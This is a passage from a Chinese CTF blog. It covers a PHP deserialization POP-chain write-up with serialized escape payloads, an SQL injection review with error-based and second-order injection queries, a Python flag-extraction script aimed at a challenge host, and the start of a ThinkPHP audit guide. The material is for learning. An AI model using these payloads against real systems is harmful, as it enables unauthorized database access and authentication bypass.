class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$b=<span class="keyword">new</span> User();</span><br><span class="line">$c=<span class="keyword">new</span> Info();</span><br><span class="line">$d=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$d-&gt;token=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$d-&gt;name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$b-&gt;age=<span class="string">&quot;select password,id from users where username=?&quot;</span>;</span><br><span class="line">$c-&gt;CtrlCase=$d;</span><br><span class="line">$b-&gt;nickname=$c;</span><br><span class="line">$a-&gt;sql=$b;</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&quot;loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload\&quot;;s:8:\&quot;CtrlCase\&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (serialize($a));</span><br></pre></td></tr></table></figure>

<p>在本地调试是可以的==但是不知道为啥放到题目下就不行了，我人傻了</p>
<p>可以看到因为数据库的账号密码不匹配所以返回了错误信息。<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210719201223.png" alt="img" style="zoom: 80%;"></p>
<p>我以为是我的payload出了问题，但是直接复制粘贴别人的也没有可以的–无语了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:3:&quot;</span>age<span class="string">&quot;;s:46:&quot;</span>select password,id <span class="keyword">from</span> users where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;;s:6:&quot;</span>dbuser<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:6:&quot;</span>dbpass<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:8:&quot;</span>database<span class="string">&quot;;s:4:&quot;</span>test<span class="string">&quot;;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;N;s:6:&quot;</span>mysqli<span class="string">&quot;;N;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>后来感觉还是很不甘心，于是又去找了一下其他人的payload，发现有一个人的可以用，可是s:2:”as”;这个部分从哪里来的属实没懂找了好几个师傅的题解都没看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">loadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload<span class="string">&quot;;s:2:&quot;</span><span class="keyword">as</span><span class="string">&quot;;O:12:&quot;</span>UpdateHelper<span class="string">&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>User<span class="string">&quot;:3:&#123;s:2:&quot;</span>id<span class="string">&quot;;N;s:3:&quot;</span>age<span class="string">&quot;;s:46:&quot;</span>select password,id <span class="keyword">from</span> users where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:8:&#123;s:8:&quot;</span>hostname<span class="string">&quot;;s:9:&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;;s:6:&quot;</span>dbuser<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:6:&quot;</span>dbpass<span class="string">&quot;;s:4:&quot;</span>root<span class="string">&quot;;s:8:&quot;</span>database<span class="string">&quot;;s:4:&quot;</span>test<span class="string">&quot;;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;N;s:6:&quot;</span>mysqli<span class="string">&quot;;N;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>而且在本地运行的时候就运行不来，盲猜是题目没配置好吧？<br>越想越不合理，又重新尝试了一下，发现我那个又可以了，但是本地却不行了,于是再尝试了一下，发现二者之间相差两个字符，也就是本地能成功的，只要拿掉一个load，也就是扣掉两个字符在题目环境下就能成功。而且很无语的是扣掉两个花括号也能成功==，无语了</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>完整做下来以后还是收获了很多，主要是有很多小坑，当代码读完一遍吼，反序列pop链的构造其实并没有很困难，就是那几个魔术方法运用一下就型，顺着思路走就行。坑点主要就是上面那几个，说说学到了啥<br>1.学到了很多调试方案，当我拼接以后一直尝试不出来的时候，对那串反序列化一个部分一个部分进行调试，才发现需要保证其完整性<br>2.那个s从哪里来的真的把我搞懵了==用题目下下来的源码去跑这个payload是出不来东西的，用原本的才行，而在题目的环境中却又必须要用那个玩意？？</p>
<p><a target="_blank" rel="noopener" href="https://www.1ight.top/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%94%bb%e5%87%bb/#comment-9">https://www.1ight.top/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%94%bb%e5%87%bb/#comment-9</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/17/sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E4%B9%A0/">sql注入复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-17</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做到sql注入的题目，都没有很敏感了，于是决定要重新复习一下</p>
<h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>源码对用户的输入的内容没有进行很好的过滤机制，导致用户输入的内容拼接到sql语句，影响原本sql语句的功能</p>
<h2 id="sql注入种类："><a href="#sql注入种类：" class="headerlink" title="sql注入种类："></a>sql注入种类：</h2><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><p>顾名思义，就是输入内容会有回显，我们可以通过回显内容判断是否成功过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1&#39;1</span><br><span class="line">?id&#x3D;-1&#39;union select database()--+ #union还需要注意一下字段数</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="数据溢出："><a href="#数据溢出：" class="headerlink" title="数据溢出："></a>数据溢出：</h4><p>就是超过mysql的数据范围会报错：<br>但是又版本限制：&lt;=5.5.4的三皈依出金额图将报错内容显示出来</p>
<h4 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;数据库</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;表名</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;字段</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;user&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;值</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select id from user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="列名重复"><a href="#列名重复" class="headerlink" title="列名重复"></a>列名重复</h4><p>这个可以用在无列名注入的时候，爆出列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from (select * from user a join user b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;id&#39;</span><br><span class="line">mysql&gt; select * from (select * from user a join user b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;username&#39;</span><br></pre></td></tr></table></figure>

<h4 id="xpath语法报错注入"><a href="#xpath语法报错注入" class="headerlink" title="xpath语法报错注入"></a>xpath语法报错注入</h4><p>利用extractvalue或者updatexml</p>
<h3 id="一些特性注入"><a href="#一些特性注入" class="headerlink" title="一些特性注入"></a>一些特性注入</h3><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>看数据库编码是否发生改变</p>
<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,2 union select * from user;</span><br></pre></td></tr></table></figure>

<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>第一次插入数据库的数据被过滤，但是在下一次使用拼凑过程中以输入的形式进行组合，造成语句恶意拼接</p>
<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>注册以后发现用户名显示了,猜测语句是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into XXX (&#39;&#39;,&#39;&#39;,&#39;&#39;) values (&#39;&#39;,&#39;&#39;&#39;&#39;,&#39;&#39;);</span><br></pre></td></tr></table></figure>

<p>所以构造一下注入语句为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxxxxxxxxx insert into XXX (email,username,passwd) values (&#39;&#39;,&#39;&#39;+(select hex(database()))+&#39;&#39;,&#39;&#39;);</span><br></pre></td></tr></table></figure>

<p>在这里我们是使用+号这个运算符作为连接符<br>查询结果可以理解为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0+database()+0</span><br></pre></td></tr></table></figure>

<p>但是如果直接这样相加<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718150013.png" alt="img"></p>
<p>是没有回显的，因为字母+数字在mysql里面加不了为0<br>所以要转化为十六进制，使用hex函数，但是经过测试，有的字符串只经过一次hex还是有字母，毕竟是十六进制~:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718150157.png" alt="img" style="zoom:67%;"><br>所以要经过两次十六进制的转换</p>
<p>接下来是构造语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&#39;+(select hex(hex(database())))+&#39;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718151556.png" alt="img" style="zoom:67%;">
经过两次hex解码，得知数据库名为web
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718151908.png" alt="img" style="zoom:67%;">
information又被过滤了--，这个时候就直接猜表名为flag就好了~
发现会有科学计数法e的存在，所以会损失精度，所以需要用substr截取

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718152455.png" alt="img" style="zoom:67%;">
这里学到了一个新姿势，就是substr from for 因为是逗号的时候会报错--

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;0&#39;+(select substr(hex(hex((select * from flag))) from 1 for 10))+&#39;0</span><br></pre></td></tr></table></figure>

<p>位数很多 需要使用脚本，脚本编写思路如下：<br>先在register注册账号，然后用login登录查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn&#x2F;register.php&#39;</span><br><span class="line">for i in range(0,20):</span><br><span class="line">    # data&#x3D;&#123;</span><br><span class="line">    #     &quot;email&quot;:str(i)+&#39;@qq.com&#39;,</span><br><span class="line">    #     &quot;username&quot;:&quot;&#39;+substr(hex(hex((select * from flag))) from &quot;+str(i*10+1)+&quot; for 10)+&#39;&quot;,</span><br><span class="line">    #     &quot;password&quot;:&quot;1&quot;</span><br><span class="line">    #     &#125;</span><br><span class="line">    # r&#x3D;requests.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">    url2 &#x3D; &#39;http:&#x2F;&#x2F;707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn&#x2F;login.php&#39;</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">        &quot;email&quot;:str(i)+&#39;@qq.com&#39;,</span><br><span class="line">        &quot;password&quot;:&quot;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url2,data&#x3D;data,allow_redirects&#x3D;True)</span><br><span class="line"></span><br><span class="line">    print (re.findall(&quot;.*?&lt;&#x2F;span&gt;&quot;,r.text)[0].replace(&#39;&lt;&#x2F;span&gt;&#39;,&#39;&#39;).strip(),end&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure>

<p>这里我是先批量注册，然后再批量登录通过正则定位编码位置然后组装<br>由于现在buu太容易崩溃惹。。。所以我就0-5获取一次然后5-10获取一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">363636433631363737423631363433383334363133383633333832443631333033353634324433343634333236363244363233343334333132443333363533393338363536353337333036313338363436333744</span><br></pre></td></tr></table></figure>

<p>结果如上，然后hex解码两次即可</p>
<h3 id="python利用正则表达式快速截取定位内容"><a href="#python利用正则表达式快速截取定位内容" class="headerlink" title="python利用正则表达式快速截取定位内容"></a>python利用正则表达式快速截取定位内容</h3><p>以前就经常在想怎么在一大串的网页回显中截取自己想要的那部分内容，后来看了一下学长的脚本，发现使用正则表达式可以达到这种操作:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">importe re<span class="comment">#引入re库</span></span><br><span class="line">str_txt = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> if (!mobileVisit) &#123;</span></span><br><span class="line"><span class="string"> googletag.defineSlot &quot;div-gpt-ad-15390086850-0&quot;).addService(googletag.pubads());</span></span><br><span class="line"><span class="string">                 &#125;</span></span><br><span class="line"><span class="string">          &quot;&quot;&quot;</span></span><br><span class="line">comment=re.compile(<span class="string">r&#x27;div-gpt-ad-(.*?)-0&#x27;</span>,re.S)</span><br><span class="line">comment1=comment.findall(str_txt)</span><br><span class="line">print(comment1[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>1.使用re正则表达式中的compile函数，在匹配内容的括号中写<strong>（.<em>?）**<br>2.其中.\</em>?代表非贪心算法，表示精准的配对<br>3.在.*?的外面加个括号表示获取括号之间的信息<br>4.在（.*?）两边加上原文本中要匹配信息两旁的信息，例如要想获得字符串“abcdefg”中的cd，就要在（.*?）里面分别加上ab和efg<br>5.compile中使用的第二个参数是re.S，表示正则表达式会将这个字符串作为一个整体，包括”\n“，如果不使用re.S参数，则只在每一行内进行匹配，如果一行没有，就换下一行重新开始，不会跨行<br>6.compile()函数返回的是一个匹配对象，单独使用无意义，需要和</strong>findall()**函数搭配使用，返回的是一个列表<br>————————————————</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44346972/article/details/106746133">https://blog.csdn.net/weixin_44346972/article/details/106746133</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/15/thinkphpv6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">thinkphpv6.0代码审计</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-15</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正好做到一题thinkphp框架漏洞，于是决定自己审计一番~，正好学学如何入门</p>
<h2 id="代码审计两种方式"><a href="#代码审计两种方式" class="headerlink" title="代码审计两种方式"></a>代码审计两种方式</h2><p>1**.通读全文源码**<br>2.<strong>功能点审计</strong>：根据漏洞对应发生函数进行功能行审计，常会用到逆向溯源数据流方法进行审计<br>3.<strong>正向追踪数据流</strong>：根据用户输入参数-&gt;来到代码逻辑-&gt;最后审计代码逻辑缺陷-&gt;尝试构造payload<br>4.<strong>逆向溯源数据流</strong>:字符串搜索指定操作函数_跟踪函数可控参数-&gt;审计代码逻辑缺陷-&gt;尝试构造payload<br><strong>CMS可分为两大类</strong><br>单入口cms:不管访问哪个模块都使用同一个入口文件，常见的MVC框架采用这种模式<br>多入口cms:每个模块都有一个入口文件(可以前端设置一个入口文件 index.php，后端创建一个入口文件admin.php，前后端的入口文件是独立的)。</p>
<h2 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h2><p>接下来我们从三个层次开始我们的源码审计思路</p>
<p>1.确定要审计的源码是什么语言</p>
<p>2.确定该源码是单入口还是多入口</p>
<p>3.确定该语言的各种漏洞诞生的函数</p>
<h2 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h2><p>一个漏洞在不同环境造成的结果也是不一样的。</p>
<p>由于关于php.ini配置的内容过于多，这里推荐浏览官方文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.php%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8%E8%BF%99%E9%87%8C%E4%B8%BB%E8%A6%81%E5%88%97%E4%B8%8Bphp.ini">https://www.php.net/manual/zh/ini.php，我们在这里主要列下php.ini</a> 主要使用的安全配置。</p>
<ul>
<li><code>safe_mode = off</code></li>
</ul>
<blockquote>
<p>用来限制文档的存取,限制环境变量的存取,控制外部程序的执行.<strong>PHP5.4.0移除。</strong></p>
</blockquote>
<ul>
<li>限制环境变量存取<code>safe_mode_allowed_env_vars = string</code></li>
</ul>
<blockquote>
<p>指定php程序可以改变的环境变量的前缀,当这个选项的值为空时,那么php可以改变任何环境变量,如果 如:safe_mode_allowed_env_vars = PHP_,当这个选项的值为空时,那么php可以改变任何环境变量。</p>
</blockquote>
<ul>
<li>外部程序执行目录<code>safe_mode_exec_dir = &quot;/usr/local/bin&quot;</code></li>
</ul>
<blockquote>
<p>当安全模式被激活，safe_mode_exec_dir参数限制通过exec()函数执行的可执行文件到指定的目录。举例来说，如果你想限制在/usr/local/bin目录执行功能，你可以使用这个指令：</p>
<p>safe_mode_exec_dir = “/usr/local/bin”</p>
</blockquote>
<ul>
<li><p>禁用函数</p>
<p><code>disable_functions</code></p>
</li>
</ul>
<blockquote>
<p>为了更安全的运行PHP,可以用此指令来禁止一些敏感函数的使用,当你想用本指令禁止一些危险函数时,切记把dl()函数也加到禁止列表,攻击者可以利用dl()函数加载自定义的php扩展突破disable_functions.配置禁止函数时可以使用逗号分隔函数名。</p>
</blockquote>
<ul>
<li>COM组件<code>com.allow_dcom = false</code></li>
</ul>
<blockquote>
<p>PHP设置在安全模式下(safe_mode),仍允许攻击者使用COM()函数来创建系统组件来还行任意命令,推荐关闭这个函数。 使用COM()函数需要在PHP.ini中配置<code>extension=php_com_dotnet.dll</code>,如果PHPversion&lt;5.4.5则不需要。</p>
</blockquote>
<ul>
<li>全局变量注册开关<code>register_globals = off</code></li>
</ul>
<blockquote>
<p>php.ini的register_globals选项的默认值为OFF,在4.2版本之前是默认开启的,当设定为On时,程序可以接收来自服务器的各种环境变量,包括表单提交的变量,这是对服务器分厂不安全的, register_globals = off时,服务器端获取数据的时候用$_GET[‘name’]来获取数据。 register_globals = on时,服务端使用POST或GET提交的变量,豆浆自动使用全局变量的值来接受。</p>
</blockquote>
<ul>
<li>魔术引号自动过滤<code>magic_quotes_gpc = on</code></li>
</ul>
<blockquote>
<p>PHP5.4.0被移除 magic_quotes_gpc = off 在php.ini中默认是关闭的,如果打开它,将自动把用户提交对sql的查询的语句进行转换,如果设置成ON,php会把所有的单引号,双引号,和反斜杠和空字符(NULL)加上反斜杠()进行转义 它会影响HTTP请求的数据(GET,POST.COOKIE),开启它会提高网站的安全性。</p>
</blockquote>
<ul>
<li>是否允许包含远程文件<code>allow_url_include = off</code></li>
</ul>
<blockquote>
<p>该配置为ON的情况下,可以直接包含远程文件,若包含的变量为可控的情况下,可以直接控制变量来执行PHP代码。</p>
</blockquote>
<ul>
<li>是否允许打开远程文件<code>allow_url_open = on</code></li>
</ul>
<blockquote>
<p>允许本地PHP文件通过调用url重写来打开或者关闭写权限,默认的封装协议提供的ftp和http协议来访问文件。</p>
</blockquote>
<ul>
<li>HTTP头部版本信息<code>expose_php = off</code></li>
</ul>
<blockquote>
<p>防止通过http头泄漏php版本信息。</p>
</blockquote>
<ul>
<li>文件上传临时目录<code>upload_tmp_dir =</code></li>
</ul>
<blockquote>
<p>上传文件临时保存的目录,如果不设置的话,则采用系统的临时目录。</p>
</blockquote>
<ul>
<li>用户可访问目录<code>open_basedir = D:\WWW</code></li>
</ul>
<blockquote>
<p>能够控制PHP脚本只能访问指定的目录,这样能够避免PHP脚本访问不应该访问的文件,一定程度上限制了。webshell的危害</p>
</blockquote>
<ul>
<li>内部错误选项<code>display_errors = on</code></li>
</ul>
<blockquote>
<p>表明实现PHP脚本的内部错误,网站发布后建议关不PHP的错误回显。</p>
</blockquote>
<ul>
<li>错误报告级别<code>error_reporting(E_ALL &amp; ~Enotice)</code></li>
</ul>
<blockquote>
<p>具体列表推荐：<a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-error-reporting.html">https://www.runoob.com/php/func-error-reporting.html</a></p>
<p>这里设置的作用是将错误级别调到最高,显示所有问题,方便环境部署时候排错。</p>
</blockquote>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>人生建议，一定要安装phpstudy的集成环境–<br>更改配置的根目录为www(5)的web目录<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210714205154.png" alt="img"><br>修改为www/web/目录打开即可，接下来去配置一下数据库<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210714205245.png" alt="img" style="zoom:67%;"></p>
<p>去config中的database.php修改一下配置信息，然后去mysql中创建一下表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database ctf;</span><br></pre></td></tr></table></figure>

